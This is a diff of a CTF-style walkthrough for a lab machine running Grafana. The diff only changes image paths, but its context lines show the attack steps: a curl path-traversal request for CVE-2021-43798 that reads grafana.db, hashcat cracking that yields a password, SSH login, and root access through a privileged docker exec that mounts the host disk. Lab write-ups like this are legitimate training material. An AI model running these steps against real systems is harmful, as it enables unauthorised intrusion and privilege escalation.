@@ -2,13 +2,13 @@
 
 ## port scan
 
-![](walkthrough_20240409125154725.png)
+![](data\(easy\)/walkthrough\_20240409125154725.png)
 
 ## service enumeration
 
 on port 3000. we have Grafana
 
-![](walkthrough_20240409125116741.png)
+![](data\(easy\)/walkthrough\_20240409125116741.png)
 
 ## exploit grafana
 
@@ -16,13 +16,13 @@ CVE-2021-43798 give us access to read local file
 
 we can use `searchsploit -m 50581`
 
-![](walkthrough_20240409125319993.png)
+![](data\(easy\)/walkthrough\_20240409125319993.png)
 
 we can change this exploit write out to file
 
-![](walkthrough_20240409125822967.png)
+![](data\(easy\)/walkthrough\_20240409125822967.png)
 
-![](walkthrough_20240409130007225.png)
+![](data\(easy\)/walkthrough\_20240409130007225.png)
 
 or just use curl command
 
@@ -30,9 +30,9 @@ or just use curl command
 curl --path-as-is http://10.10.68.81:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
 ```
 
-![](walkthrough_20240409131056541.png)
+![](data\(easy\)/walkthrough\_20240409131056541.png)
 
-![](walkthrough_20240409131205244.png)
+![](data\(easy\)/walkthrough\_20240409131205244.png)
 
 ## crack grafana user password
 
@@ -69,19 +69,19 @@ sudo hashcat ./hash /usr/share/wordlists/rockyou.txt
 
 the cred is `beautiful1`
 
-![](walkthrough_20240409132039226.png)
+![](data\(easy\)/walkthrough\_20240409132039226.png)
 
 ## ssh
 
 we can use cracked password ssh into target
 
-![](walkthrough_20240409132148203.png)
+![](data\(easy\)/walkthrough\_20240409132148203.png)
 
 ## Privilege Escalation
 
 we can use `/snap/bin/docker exec *` with root privilege
 
-![](walkthrough_20240409132333541.png)
+![](data\(easy\)/walkthrough\_20240409132333541.png)
 
 ```bash
 sudo docker exec --privileged -i -u root -t grafana /bin/bash
@@ -89,4 +89,4 @@ sudo docker exec --privileged -i -u root -t grafana /bin/bash
 
 and there have a disk `/dev/xvda1`. we can mount it to access host file system
 
-![](walkthrough_20240409135956780.png)
+![](data\(easy\)/walkthrough\_20240409135956780.png)
